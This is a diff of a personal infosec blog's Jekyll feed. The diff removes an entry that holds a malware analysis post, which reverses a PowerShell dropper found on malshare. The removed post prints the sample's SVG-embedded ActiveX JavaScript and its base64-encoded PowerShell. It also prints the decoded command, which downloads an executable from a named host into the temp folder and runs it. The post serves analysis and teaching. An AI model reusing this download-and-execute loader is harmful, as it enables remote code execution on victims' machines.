@@ -1,44 +1,4 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-02-12T21:37:27-05:00</updated><id>http://localhost:4000/</id><title type="html">wolfshirtz</title><subtitle>The personal blog of Tristan Messner(@wolfshirtz). I will mostly talk about information security and  software development. I am an information security student who is looking to become a red teamer or security researcher. I love a good cup of coffee and making things.</subtitle><entry><title type="html">Malware Safari: Reversing A Powershell Dropper</title><link href="http://localhost:4000/malware/re/2020/02/12/Malware-Safari-Reversing-A-Powershell-Dropper.markdown.bak" rel="alternate" type="text/html" title="Malware Safari: Reversing A Powershell Dropper" /><published>2020-02-12T00:00:00-05:00</published><updated>2020-02-12T00:00:00-05:00</updated><id>http://localhost:4000/malware/re/2020/02/12/Malware-Safari:-Reversing-A-Powershell-Dropper.markdown</id><content type="html" xml:base="http://localhost:4000/malware/re/2020/02/12/Malware-Safari-Reversing-A-Powershell-Dropper.markdown.bak"># Malware Safari: Reversing A Powershell Dropper
-Recently I was reading a twitter thread by [@\_mbanana][banana] about malware analysis and saw the website malshare mentioned.
-To make a long story short I signed up for an api key and the first sample I saw had a powershell label. I decided to look into it
-and found a powershell dropper.
-
-## Overview
-The [malware][malshare] started from an online file that created an activeXobject that spawned a powershell dropper.
-The dropper than downloaded an executable from the url `https://cdn.filesend.jp/private/kO85h9cY6XXElZXVg-PK9KJX3TXoOnxMkTnVjca9hrJOUuGkw8PMomNdQ2OEcc2E/Secures.exe`.
-The link has been removed because it was known to host malicous content.
-
-## The initial part of the stager
-The first part of the stager is an svg file with javascript embedded inside of it.
-The embedded javascript is a fairly common one-liner used to get code execution outside of a browser.
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ActiveXObject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;WScript.Shell&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Run&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;PowERsHELl.ExE -ExecutionPolicy bypass /e 
-IAAoAE4ARQB3AC0AbwBiAGoARQBjAHQAIAAcIGAATgBgAGUAYABUAGAALgBgAFcAYABlAGAAQgBgAEMAYABsAGAAaQBgAGUAYABOAGAAVAAdICkALgBEAG8AdwBuAEwAbwBBAGQAZgBJAGwARQAoACAAHSBoAHQAdABwAHMAOgAvAC8AYwBkAG4ALgBmAGkAbABlAHMAZQBuAGQALgBqAHAALwBwAHIAaQB2AGEAdABlAC8AawBPADgANQBoADkAYwBZADYAWABYAEUAbABaAFgAVgBnAC0AUABLADkASwBKAFgAMwBUAFgAbwBPAG4AeABNAGsAVABuAFYAagBjAGEAOQBoAHIASgBPAFUAdQBHAGsAdwA4AFAATQBvAG0ATgBkAFEAMgBPAEUAYwBjADIARQAvAFMAZQBjAHUAcgBlAHMALgBlAHgAZQAdICAALAAgAB0gJABFAE4AdgA6AHQAZQBtAHAAXABUAE4AVwB3AGYALgBlAHgAZQAdICAAKQAgADsAIABzAHQAQQBSAHQAIAAdICQARQBOAHYAOgB0AGUAbQBwAFwAVABOAFcAdwBmAC4AZQB4AGUAHSA=&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-The javascript creates an activeXobject that is used to run a base64 encoded powershell command.
-Which brings us to the second stage of our dropper.
-
-## The second stage of the dropper
-After looking at the encoded command I decided to copy the base64 blob into its own file, which I called dropper.b64.
-To decode the encoded command I ran the following command `cat dropper.b64 | base64 -d`.
-Which output the following powershell
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;NEw-objEct&lt;/span&gt;  &lt;span class=&quot;se&quot;&gt;`N`e`T`.`W`e`B`C`l`i`e`N`T&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-.DownLoAdfIlE&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;https://cdn.filesend.jp/private/kO85h9cY6XXElZXVg-PK9KJX3TXoOnxMkTnVjca9hrJOUuGkw8PMomNdQ2OEcc2E/Secures.exe&quot;&lt;/span&gt;, &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$ENv&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;:temp\TNWwf.exe&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;; 
-&lt;span class=&quot;nb&quot;&gt;stARt&lt;/span&gt;  &lt;span class=&quot;nv&quot;&gt;$ENv&lt;/span&gt;:temp\TNWwf.exe&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-The powershell if fairly straight forward; A dotNet `WebClient` is created and is used to download an executable into a temp file.
-That file is then executed by the powershell dropper.
-And this is where the journey ends because the cloud provider removed the malicious payload from their website. :)
-
-## Ending notes
-The dropper is initially staged by a bit of javascript embedded inside of an svg, which in turn spawns a powershell script that downloads
-the, now removed, payload.
-
-
-[banana]: https://twitter.com/_mbanana/status/1225570787475804160
-[malshare]: https://malshare.com/sample.php?action=detail&amp;hash=22045d1f1ab14eb1f1f0e92d0baee483</content><author><name></name></author><summary type="html"># Malware Safari: Reversing A Powershell Dropper Recently I was reading a twitter thread by [@\_mbanana][banana] about malware analysis and saw the website malshare mentioned. To make a long story short I signed up for an api key and the first sample I saw had a powershell label. I decided to look into it and found a powershell dropper. [banana]: https://twitter.com/_mbanana/status/1225570787475804160 [malshare]: https://malshare.com/sample.php?action=detail&amp;hash=22045d1f1ab14eb1f1f0e92d0baee483</summary></entry><entry><title type="html">Malware Safari: Reversing A Powershell Dropper</title><link href="http://localhost:4000/malware/re/2020/02/12/Malware-Safari-Reversing-A-Powershell-Dropper.html" rel="alternate" type="text/html" title="Malware Safari: Reversing A Powershell Dropper" /><published>2020-02-12T00:00:00-05:00</published><updated>2020-02-12T00:00:00-05:00</updated><id>http://localhost:4000/malware/re/2020/02/12/Malware-Safari:-Reversing-A-Powershell-Dropper</id><content type="html" xml:base="http://localhost:4000/malware/re/2020/02/12/Malware-Safari-Reversing-A-Powershell-Dropper.html">&lt;h1 id=&quot;malware-safari-reversing-a-powershell-dropper&quot;&gt;Malware Safari: Reversing A Powershell Dropper&lt;/h1&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-02-12T21:39:17-05:00</updated><id>http://localhost:4000/</id><title type="html">wolfshirtz</title><subtitle>The personal blog of Tristan Messner(@wolfshirtz). I will mostly talk about information security and  software development. I am an information security student who is looking to become a red teamer or security researcher. I love a good cup of coffee and making things.</subtitle><entry><title type="html">Malware Safari: Reversing A Powershell Dropper</title><link href="http://localhost:4000/malware/re/2020/02/12/Malware-Safari-Reversing-A-Powershell-Dropper.html" rel="alternate" type="text/html" title="Malware Safari: Reversing A Powershell Dropper" /><published>2020-02-12T00:00:00-05:00</published><updated>2020-02-12T00:00:00-05:00</updated><id>http://localhost:4000/malware/re/2020/02/12/Malware-Safari:-Reversing-A-Powershell-Dropper</id><content type="html" xml:base="http://localhost:4000/malware/re/2020/02/12/Malware-Safari-Reversing-A-Powershell-Dropper.html">&lt;h1 id=&quot;malware-safari-reversing-a-powershell-dropper&quot;&gt;Malware Safari: Reversing A Powershell Dropper&lt;/h1&gt;
 &lt;p&gt;Recently I was reading a twitter thread by &lt;a href=&quot;https://twitter.com/_mbanana/status/1225570787475804160&quot;&gt;@_mbanana&lt;/a&gt; about malware analysis and saw the website malshare mentioned.
 To make a long story short I signed up for an api key and the first sample I saw had a powershell label. I decided to look into it
 and found a powershell dropper.&lt;/p&gt;
